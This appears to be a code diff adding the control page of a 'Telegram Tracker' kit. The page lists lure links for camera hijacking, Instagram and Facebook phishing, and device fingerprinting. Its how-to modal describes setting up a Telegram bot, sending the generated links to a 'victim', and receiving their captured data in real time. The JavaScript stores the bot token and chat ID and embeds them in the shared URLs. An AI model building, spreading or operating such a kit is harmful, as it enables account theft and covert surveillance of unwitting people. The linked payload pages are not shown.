@@ -1,0 +1,780 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Telegram Tracker</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet" />
+    <style>
+        /* ---------- RESET & BASE ---------- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #0a0f0a;
+            color: #d0e0d0;
+            min-height: 100vh;
+            padding: 0 0 80px 0;
+            display: flex;
+            flex-direction: column;
+        }
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: #b8960f; border-radius: 10px; }
+
+        /* ---------- HEADER (Gold Accent) ---------- */
+        .app-header {
+            padding: 16px 20px 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: #0f1a0f;
+            border-bottom: 2px solid #b8960f;
+            position: sticky;
+            top: 0;
+            z-index: 40;
+        }
+        .app-header .left .title {
+            font-size: 1.4rem;
+            font-weight: 800;
+            color: #f5c518;
+            letter-spacing: -0.3px;
+            text-shadow: 0 0 20px rgba(245, 197, 24, 0.1);
+        }
+        .app-header .left .sub {
+            font-size: 0.6rem;
+            color: #7a8a6a;
+            font-weight: 500;
+            letter-spacing: 0.8px;
+            text-transform: uppercase;
+        }
+        .app-header .right {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+        .close-btn {
+            background: transparent;
+            border: 1px solid #3a5a2a;
+            color: #8a9a7a;
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            font-size: 1rem;
+            transition: 0.15s;
+        }
+        .close-btn:hover {
+            border-color: #f5c518;
+            color: #f5c518;
+        }
+        .settings-trigger {
+            background: transparent;
+            border: 1px solid #3a5a2a;
+            color: #8a9a7a;
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.2rem;
+            cursor: pointer;
+            transition: 0.15s;
+            border: none;
+            font-family: inherit;
+        }
+        .settings-trigger:hover {
+            color: #f5c518;
+        }
+        #howToUseBtn {
+            background: transparent;
+            border: 1px solid #3a5a2a;
+            color: #b0c0a0;
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.2rem;
+            cursor: pointer;
+            transition: 0.15s;
+            font-family: inherit;
+        }
+        #howToUseBtn:hover {
+            border-color: #f5c518;
+            color: #f5c518;
+        }
+
+        /* ---------- SEARCH ---------- */
+        .search-wrap {
+            padding: 14px 20px 12px;
+            background: #0f1a0f;
+            border-bottom: 1px solid #1a2a1a;
+            position: sticky;
+            top: 60px;
+            z-index: 30;
+        }
+        #searchInput {
+            width: 100%;
+            padding: 14px 18px 14px 46px;
+            border-radius: 60px;
+            background: #162416;
+            border: 1px solid #2a4a2a;
+            color: #d0e8d0;
+            font-size: 0.95rem;
+            outline: none;
+            transition: 0.15s;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23b8960f' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Ccircle cx='11' cy='11' r='8'/%3E%3Cline x1='21' y1='21' x2='16.65' y2='16.65'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: 16px center;
+            background-size: 16px;
+        }
+        #searchInput:focus {
+            border-color: #f5c518;
+        }
+        #searchInput::placeholder {
+            color: #4a5a3a;
+        }
+
+        /* ---------- CARDS (VIP LIST STYLE) ---------- */
+        .content {
+            flex: 1;
+            padding: 12px 16px 20px;
+        }
+        .cards-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        .tool-card {
+            background: #111e11;
+            border: 1px solid #1a2a1a;
+            border-radius: 16px;
+            padding: 14px 16px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.3);
+            transition: 0.15s;
+            cursor: default;
+        }
+        .tool-card:hover {
+            border-color: #b8960f;
+            background: #162416;
+        }
+        .tool-card .icon {
+            font-size: 1.8rem;
+            line-height: 1;
+            flex-shrink: 0;
+            width: 44px;
+            text-align: center;
+        }
+        .tool-card .info {
+            flex: 1;
+            min-width: 0;
+        }
+        .tool-card .info .name {
+            font-weight: 700;
+            font-size: 1rem;
+            color: #e8f0e0;
+            line-height: 1.2;
+            letter-spacing: -0.2px;
+        }
+        .tool-card .info .desc {
+            font-size: 0.7rem;
+            color: #8aaa7a;
+            margin-top: 2px;
+            line-height: 1.3;
+            font-weight: 400;
+        }
+        .tool-card .info .filename {
+            font-size: 0.5rem;
+            color: #5a7a4a;
+            background: #1a2a1a;
+            padding: 1px 8px;
+            border-radius: 30px;
+            display: inline-block;
+            margin-top: 3px;
+            border: 1px solid #2a4a2a;
+            font-family: monospace;
+        }
+        .tool-card .actions {
+            display: flex;
+            gap: 6px;
+            flex-shrink: 0;
+        }
+        .preview-btn,
+        .copy-btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            padding: 4px 12px;
+            border-radius: 40px;
+            font-size: 0.6rem;
+            font-weight: 600;
+            text-decoration: none;
+            transition: 0.15s;
+            font-family: inherit;
+            cursor: pointer;
+            border: 1px solid transparent;
+            background: transparent;
+            border-color: #2a4a2a;
+            color: #7a9a6a;
+            line-height: 1.4;
+            white-space: nowrap;
+        }
+        .preview-btn:hover {
+            border-color: #4a7a4a;
+            color: #b0d0a0;
+        }
+        .copy-btn {
+            border-color: #1a4a2a;
+            color: #f5c518;
+        }
+        .copy-btn:hover {
+            border-color: #f5c518;
+            color: #f5c518;
+        }
+        .copy-btn.copied {
+            background: #f5c518;
+            color: #0a120a;
+            border-color: #f5c518;
+        }
+
+        .no-result {
+            text-align: center;
+            color: #3a5a3a;
+            padding: 40px 0;
+            font-style: italic;
+            display: none;
+            font-size: 0.9rem;
+        }
+
+        /* ---------- BOTTOM NAV (Gold) ---------- */
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: #0f1a0f;
+            border-top: 2px solid #b8960f;
+            padding: 8px 0 16px;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            z-index: 60;
+            box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.4);
+        }
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 2px;
+            text-decoration: none;
+            color: #4a5a3a;
+            font-size: 0.5rem;
+            font-weight: 700;
+            transition: 0.15s;
+            letter-spacing: 0.5px;
+            padding: 4px 14px;
+            border-radius: 30px;
+            background: transparent;
+            border: none;
+            cursor: pointer;
+            font-family: inherit;
+            position: relative;
+        }
+        .nav-item .nav-icon {
+            font-size: 1.4rem;
+            line-height: 1;
+        }
+        .nav-item.active {
+            color: #f5c518;
+        }
+        .nav-item.active::after {
+            content: '';
+            position: absolute;
+            bottom: -4px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 16px;
+            height: 2px;
+            background: #f5c518;
+            border-radius: 10px;
+        }
+        .nav-item:hover {
+            color: #b8960f;
+        }
+
+        /* ---------- SETTINGS DRAWER ---------- */
+        .settings-drawer {
+            position: fixed;
+            bottom: 70px;
+            left: 12px;
+            right: 12px;
+            max-height: 0;
+            background: #111e11;
+            border: 1px solid #1a3a1a;
+            border-radius: 24px 24px 16px 16px;
+            overflow: hidden;
+            transition: max-height 0.4s ease, opacity 0.3s ease;
+            opacity: 0;
+            z-index: 55;
+            box-shadow: 0 -8px 40px rgba(0, 0, 0, 0.6);
+            pointer-events: none;
+        }
+        .settings-drawer.open {
+            max-height: 420px;
+            opacity: 1;
+            pointer-events: auto;
+            border-color: #b8960f;
+        }
+        .settings-drawer .drawer-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 14px 18px 10px;
+            border-bottom: 1px solid #1a3a1a;
+        }
+        .settings-drawer .drawer-header h3 {
+            font-size: 0.9rem;
+            font-weight: 700;
+            color: #d0e0c0;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .settings-drawer .drawer-header h3 span {
+            font-size: 0.55rem;
+            background: #1a2a1a;
+            color: #f5c518;
+            padding: 0 10px;
+            border-radius: 30px;
+            font-weight: 400;
+        }
+        .close-drawer {
+            background: transparent;
+            border: 1px solid #2a4a2a;
+            color: #4a6a4a;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            font-size: 1rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: none;
+            font-family: inherit;
+        }
+        .close-drawer:hover {
+            color: #d0e8d0;
+        }
+        .settings-body {
+            padding: 14px 18px 18px;
+        }
+        .settings-body label {
+            display: block;
+            font-size: 0.65rem;
+            font-weight: 600;
+            color: #6a8a5a;
+            margin-bottom: 4px;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+        .settings-body input {
+            width: 100%;
+            padding: 10px 14px;
+            border-radius: 16px;
+            background: #162416;
+            border: 1px solid #2a4a2a;
+            color: #d0e8d0;
+            font-size: 0.85rem;
+            outline: none;
+            transition: 0.15s;
+            margin-bottom: 12px;
+        }
+        .settings-body input:focus {
+            border-color: #f5c518;
+        }
+        .settings-body input::placeholder {
+            color: #3a5a3a;
+        }
+        .settings-body .btn-save {
+            background: transparent;
+            border: 1px solid #b8960f;
+            color: #f5c518;
+            padding: 10px 20px;
+            border-radius: 60px;
+            font-size: 0.85rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.15s;
+            font-family: inherit;
+            width: 100%;
+        }
+        .settings-body .btn-save:hover {
+            background: #b8960f;
+            color: #0a120a;
+            border-color: #b8960f;
+        }
+        .settings-body .status-msg {
+            font-size: 0.65rem;
+            margin-top: 8px;
+            color: #5a7a5a;
+            text-align: center;
+        }
+        .settings-body .status-msg.success { color: #f5c518; }
+        .settings-body .status-msg.error { color: #ff6b6b; }
+
+        /* ---------- TOAST ---------- */
+        .toast {
+            position: fixed;
+            bottom: 86px;
+            left: 50%;
+            transform: translateX(-50%) translateY(60px);
+            background: #111e11;
+            border: 1px solid #b8960f;
+            color: #d0e8d0;
+            padding: 10px 24px;
+            border-radius: 60px;
+            font-weight: 600;
+            font-size: 0.8rem;
+            opacity: 0;
+            transition: opacity 0.3s ease, transform 0.3s ease;
+            pointer-events: none;
+            z-index: 99;
+            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.5);
+            white-space: nowrap;
+        }
+        .toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+
+        /* ---------- RESPONSIVE ---------- */
+        @media (max-width: 460px) {
+            .tool-card { padding: 12px 12px; gap: 10px; }
+            .tool-card .icon { font-size: 1.4rem; width: 36px; }
+            .tool-card .info .name { font-size: 0.85rem; }
+            .tool-card .info .desc { font-size: 0.6rem; }
+            .app-header .left .title { font-size: 1.2rem; }
+            .bottom-nav .nav-item .nav-icon { font-size: 1.2rem; }
+            .settings-drawer.open { max-height: 380px; }
+            .toast { font-size: 0.65rem; padding: 6px 16px; bottom: 74px; }
+            .preview-btn, .copy-btn { padding: 3px 10px; font-size: 0.55rem; }
+        }
+        @media (min-width: 600px) {
+            .tool-card { padding: 16px 20px; }
+            .settings-drawer { left: 24px; right: 24px; }
+        }
+        @media (min-width: 900px) {
+            .content { max-width: 800px; margin: 0 auto; }
+            .settings-drawer { max-width: 480px; left: 50%; transform: translateX(-50%); bottom: 76px; }
+            .settings-drawer.open { max-height: 460px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- HEADER -->
+    <header class="app-header">
+        <div class="left">
+            <div class="title">Telegram Tracker</div>
+            <div class="sub">Share · Track · Telegram</div>
+        </div>
+        <div class="right">
+            <button class="settings-trigger" id="settingsTrigger">⚙️</button>
+            <button id="howToUseBtn">🕵️</button>
+            <a href="#" onclick="window.history.back(); return false;" class="close-btn" style="text-decoration:none; color:#8a9a7a; font-weight:600; font-size:1rem;">✕</a>
+        </div>
+    </header>
+
+    <!-- SEARCH -->
+    <div class="search-wrap">
+        <input type="text" id="searchInput" placeholder="Search pranks by name or file..." autocomplete="off" />
+    </div>
+
+    <!-- CONTENT -->
+    <div class="content">
+        <div class="cards-grid" id="cardsGrid">
+
+            <!-- Camera Hack -->
+            <div class="tool-card" data-name="Camera Hack" data-file="camera-hack.html">
+                <span class="icon">📸</span>
+                <div class="info">
+                    <div class="name">Camera Hack</div>
+                    <div class="desc">Hack the victim's live camera</div>
+                    
+                </div>
+                <div class="actions">
+                    <a href="camera-hack.html" target="_blank" class="preview-btn">preview</a>
+                    <button class="copy-btn" data-link="camera-hack.html">copy</button>
+                </div>
+            </div>
+
+            <!-- Crush Test -->
+            <div class="tool-card" data-name="Crush Test" data-file="crush-name.html">
+                <span class="icon">💖</span>
+                <div class="info">
+                    <div class="name">Crush Test</div>
+                    <div class="desc">Check if your girlfriend really likes someone else</div>
+
+                </div>
+                <div class="actions">
+                    <a href="crush-name.html" target="_blank" class="preview-btn">preview</a>
+                    <button class="copy-btn" data-link="crush-name.html">copy</button>
+                </div>
+            </div>
+
+            <!-- Instagram & Facebook Phish -->
+            <div class="tool-card" data-name="Instagram & Facebook Phish" data-file="free-followers.html">
+                <span class="icon" style="display:flex; align-items:center; justify-content:center; gap:2px; font-size:1.6rem;">
+                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" style="width:20px; height:20px;">
+                        <defs><linearGradient id="ig" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#f09433"/><stop offset="50%" stop-color="#e6683c"/><stop offset="100%" stop-color="#dc2743"/></linearGradient></defs>
+                        <rect x="2" y="2" width="20" height="20" rx="6" fill="url(#ig)"/>
+                        <circle cx="12" cy="12" r="5" fill="none" stroke="#fff" stroke-width="1.5"/>
+                        <circle cx="17.5" cy="6.5" r="1.2" fill="#fff"/>
+                    </svg>
+                    <span style="color:#4a7a4a; font-weight:300; font-size:0.7rem;">+</span>
+                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" style="width:20px; height:20px;">
+                        <rect x="2" y="2" width="20" height="20" rx="4" fill="#1877f2"/>
+                        <path d="M16 10h-2V8.5c0-.8.5-1 1-1h1V5h-2c-2 0-3 1.5-3 3V10H9v2h2v7h3v-7h2l1-2z" fill="#fff"/>
+                    </svg>
+                </span>
+                <div class="info">
+                    <div class="name">Instagram &amp; Facebook Phish</div>
+                    <div class="desc">With this you can hack the victim's Instagram and Facebook ID.</div>
+                    
+                </div>
+                <div class="actions">
+                    <a href="free-followers.html" target="_blank" class="preview-btn">preview</a>
+                    <button class="copy-btn" data-link="free-followers.html">copy</button>
+                </div>
+            </div>
+
+
+    <!-- Device Scanner -->
+<div class="tool-card" data-name="Device Scanner" data-file="device-scanner.html">
+    <span class="icon">📱</span>
+    <div class="info">
+        <div class="name">Device Scanner</div>
+        <div class="desc">Scan device info (IP, OS, Browser, etc.)</div>
+   
+    </div>
+    <div class="actions">
+        <a href="device-scanner.html" target="_blank" class="preview-btn">preview</a>
+        <button class="copy-btn" data-link="device-scanner.html">copy</button>
+    </div>
+</div>
+
+            <!-- No result -->
+            <div class="no-result" id="noResult">😕 No prank found. Try a different keyword.</div>
+        </div>
+    </div>
+
+    <!-- BOTTOM NAV -->
+    <nav class="bottom-nav">
+        <button class="nav-item active" id="navLinks">
+            <span class="nav-icon">📋</span>
+            <span>Links</span>
+        </button>
+        <button class="nav-item" id="navSettings">
+            <span class="nav-icon">⚙️</span>
+            <span>Settings</span>
+        </button>
+        <a href="#" onclick="window.history.back(); return false;" class="nav-item">
+            <span class="nav-icon">🏠</span>
+            <span>Home</span>
+        </a>
+    </nav>
+
+    <!-- SETTINGS DRAWER -->
+    <div class="settings-drawer" id="settingsDrawer">
+        <div class="drawer-header">
+            <h3>⚙️ Telegram Setup <span>required</span></h3>
+            <button class="close-drawer" id="closeDrawer">✕</button>
+        </div>
+        <div class="settings-body">
+            <label>🤖 Bot Token</label>
+            <input type="text" id="botToken" placeholder="e.g. 123456:ABC-DEF" />
+            <label>📨 Chat ID</label>
+            <input type="text" id="chatId" placeholder="e.g. 123456789" />
+            <button class="btn-save" id="saveSettings">💾 Save &amp; Test</button>
+            <div class="status-msg" id="statusMsg">Enter your bot token and chat ID, then save.</div>
+        </div>
+    </div>
+
+    <!-- TOAST -->
+    <div id="toast" class="toast">✅ Copied!</div>
+
+    <!-- HOW TO USE MODAL -->
+    <div id="howToUseModal" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.7); backdrop-filter:blur(8px); z-index:999; justify-content:center; align-items:center; padding:20px;">
+        <div style="background:#111e11; border:1px solid #b8960f; border-radius:24px; max-width:500px; width:100%; padding:30px 24px; box-shadow:0 20px 60px rgba(0,0,0,0.6); position:relative; max-height:90vh; overflow-y:auto;">
+            <button id="closeHowToUse" style="position:absolute; top:12px; right:16px; background:transparent; border:none; color:#4a6a4a; font-size:1.5rem; cursor:pointer; font-family:inherit;">✕</button>
+            <h2 style="color:#f5c518; font-size:1.4rem; font-weight:700; margin-bottom:6px; letter-spacing:-0.3px;">🕵️ How to Use</h2>
+            <p style="color:#7aaa7a; font-size:0.85rem; margin-bottom:20px; border-bottom:1px solid #1a3a1a; padding-bottom:12px;">Follow these steps to share and track victims via Telegram.</p>
+            <div style="display:flex; flex-direction:column; gap:16px;">
+                <div style="display:flex; gap:14px; align-items:flex-start;">
+                    <span style="background:#1a3a1a; color:#f5c518; width:28px; height:28px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:700; font-size:0.8rem; flex-shrink:0;">1</span>
+                    <div><div style="color:#e0f0e0; font-weight:600; font-size:0.95rem;">Set up Telegram Bot</div><div style="color:#7aaa7a; font-size:0.8rem; line-height:1.4;">Click <strong style="color:#f5c518;">⚙️ Settings</strong> → enter your <strong style="color:#f5c518;">Bot Token</strong> and <strong style="color:#f5c518;">Chat ID</strong> → click <strong style="color:#f5c518;">Save &amp; Test</strong>.</div></div>
+                </div>
+                <div style="display:flex; gap:14px; align-items:flex-start;">
+                    <span style="background:#1a3a1a; color:#f5c518; width:28px; height:28px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:700; font-size:0.8rem; flex-shrink:0;">2</span>
+                    <div><div style="color:#e0f0e0; font-weight:600; font-size:0.95rem;">Copy a Tool Link</div><div style="color:#7aaa7a; font-size:0.8rem; line-height:1.4;">Choose any tools from the list and click <strong style="color:#f5c518;">copy</strong>. The link will include your Telegram credentials automatically.</div></div>
+                </div>
+                <div style="display:flex; gap:14px; align-items:flex-start;">
+                    <span style="background:#1a3a1a; color:#f5c518; width:28px; height:28px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:700; font-size:0.8rem; flex-shrink:0;">3</span>
+                    <div><div style="color:#e0f0e0; font-weight:600; font-size:0.95rem;">Share the Link</div><div style="color:#7aaa7a; font-size:0.8rem; line-height:1.4;">Send the copied link to your victim via WhatsApp, Messenger, or any other platform.</div></div>
+                </div>
+                <div style="display:flex; gap:14px; align-items:flex-start;">
+                    <span style="background:#1a3a1a; color:#f5c518; width:28px; height:28px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:700; font-size:0.8rem; flex-shrink:0;">4</span>
+                    <div><div style="color:#e0f0e0; font-weight:600; font-size:0.95rem;">Track Activity</div><div style="color:#7aaa7a; font-size:0.8rem; line-height:1.4;">When the victim opens the link, their activity will be sent to your Telegram bot <strong style="color:#f5c518;">in real-time</strong>.</div></div>
+                </div>
+            </div>
+            <div style="margin-top:20px; padding:12px 16px; background:#1a2a1a; border-radius:16px; border-left:3px solid #f5c518;">
+                <div style="color:#b0d0b0; font-size:0.8rem; display:flex; gap:8px; align-items:center;">
+                    <span style="font-size:1.2rem;">💡</span>
+                    <span><strong style="color:#f5c518;">Pro Tip:</strong> Use <strong style="color:#f5c518;">preview</strong> to test a tool yourself before sharing.</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ---------- HOW TO USE MODAL ----------
+        const howToBtn = document.getElementById('howToUseBtn');
+        const modal = document.getElementById('howToUseModal');
+        const closeModal = document.getElementById('closeHowToUse');
+        if (howToBtn && modal && closeModal) {
+            howToBtn.addEventListener('click', function() { modal.style.display = 'flex'; });
+            closeModal.addEventListener('click', function() { modal.style.display = 'none'; });
+            modal.addEventListener('click', function(e) { if (e.target === modal) modal.style.display = 'none'; });
+            document.addEventListener('keydown', function(e) { if (e.key === 'Escape' && modal.style.display === 'flex') modal.style.display = 'none'; });
+        }
+
+        // ---------- SEARCH ----------
+        const searchInput = document.getElementById('searchInput');
+        const cards = document.querySelectorAll('.tool-card');
+        const noResult = document.getElementById('noResult');
+        searchInput.addEventListener('input', function() {
+            const q = this.value.toLowerCase().trim();
+            let found = false;
+            cards.forEach(card => {
+                const name = (card.dataset.name || '').toLowerCase();
+                const file = (card.dataset.file || '').toLowerCase();
+                const match = name.includes(q) || file.includes(q);
+                card.style.display = match ? 'flex' : 'none';
+                if (match) found = true;
+            });
+            noResult.style.display = (found || q === '') ? 'none' : 'block';
+        });
+
+        // ---------- SETTINGS DRAWER ----------
+        const drawer = document.getElementById('settingsDrawer');
+        const settingsTrigger = document.getElementById('settingsTrigger');
+        const navSettings = document.getElementById('navSettings');
+        const navLinks = document.getElementById('navLinks');
+        const closeDrawer = document.getElementById('closeDrawer');
+        function openDrawer() {
+            drawer.classList.add('open');
+            navSettings.classList.add('active');
+            navLinks.classList.remove('active');
+            document.getElementById('botToken').value = localStorage.getItem('tg_bot_token') || '';
+            document.getElementById('chatId').value = localStorage.getItem('tg_chat_id') || '';
+        }
+        function closeDrawerFn() {
+            drawer.classList.remove('open');
+            navSettings.classList.remove('active');
+            navLinks.classList.add('active');
+        }
+        settingsTrigger.addEventListener('click', openDrawer);
+        navSettings.addEventListener('click', function(e) {
+            e.preventDefault();
+            if (drawer.classList.contains('open')) closeDrawerFn();
+            else openDrawer();
+        });
+        closeDrawer.addEventListener('click', closeDrawerFn);
+
+        // ---------- SAVE SETTINGS ----------
+        const saveBtn = document.getElementById('saveSettings');
+        const statusMsg = document.getElementById('statusMsg');
+        const botTokenInput = document.getElementById('botToken');
+        const chatIdInput = document.getElementById('chatId');
+        saveBtn.addEventListener('click', async function() {
+            const token = botTokenInput.value.trim();
+            const chatId = chatIdInput.value.trim();
+            if (!token || !chatId) {
+                statusMsg.textContent = '⚠️ Please fill both fields.';
+                statusMsg.className = 'status-msg error';
+                return;
+            }
+            localStorage.setItem('tg_bot_token', token);
+            localStorage.setItem('tg_chat_id', chatId);
+            statusMsg.textContent = '⏳ Sending test message...';
+            statusMsg.className = 'status-msg';
+            try {
+                const res = await fetch(
+                    `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=✅Your bot is now live.`
+                );
+                const data = await res.json();
+                if (data.ok) {
+                    statusMsg.textContent = '✅ Test successful! You\'ll receive updates here.';
+                    statusMsg.className = 'status-msg success';
+                } else {
+                    statusMsg.textContent = '❌ Error: ' + (data.description || 'Invalid token or chat ID');
+                    statusMsg.className = 'status-msg error';
+                }
+            } catch (e) {
+                statusMsg.textContent = '❌ Network error. Check your connection.';
+                statusMsg.className = 'status-msg error';
+            }
+        });
+
+        // ---------- COPY BUTTONS ----------
+        const toast = document.getElementById('toast');
+        const copyBtns = document.querySelectorAll('.copy-btn');
+        copyBtns.forEach(btn => {
+            btn.addEventListener('click', async function(e) {
+                e.stopPropagation();
+                const link = this.dataset.link;
+                const base = window.location.href.split('/').slice(0, -1).join('/');
+                const fullUrl = base + '/' + link;
+                const token = localStorage.getItem('tg_bot_token') || '';
+                const chatId = localStorage.getItem('tg_chat_id') || '';
+                let urlWithParams = fullUrl;
+                if (token && chatId) {
+                    const separator = fullUrl.includes('?') ? '&' : '?';
+                    urlWithParams = fullUrl + separator + 'tg_token=' + encodeURIComponent(token) +
+                        '&tg_chat=' + encodeURIComponent(chatId);
+                }
+                try {
+                    await navigator.clipboard.writeText(urlWithParams);
+                    toast.textContent = '✅ Copied: ' + link;
+                    toast.classList.add('show');
+                    this.textContent = '✓';
+                    this.classList.add('copied');
+                    setTimeout(() => {
+                        this.textContent = 'copy';
+                        this.classList.remove('copied');
+                    }, 1500);
+                    setTimeout(() => toast.classList.remove('show'), 2000);
+                } catch (_) {
+                    alert('Could not copy. Please copy manually:\n' + urlWithParams);
+                }
+            });
+        });
+
+        console.log('%c🌟 Telegram Tracker · VIP Gold', 'font-size:18px; color:#f5c518; font-weight:bold;');
+    </script>
+</body>
+</html>
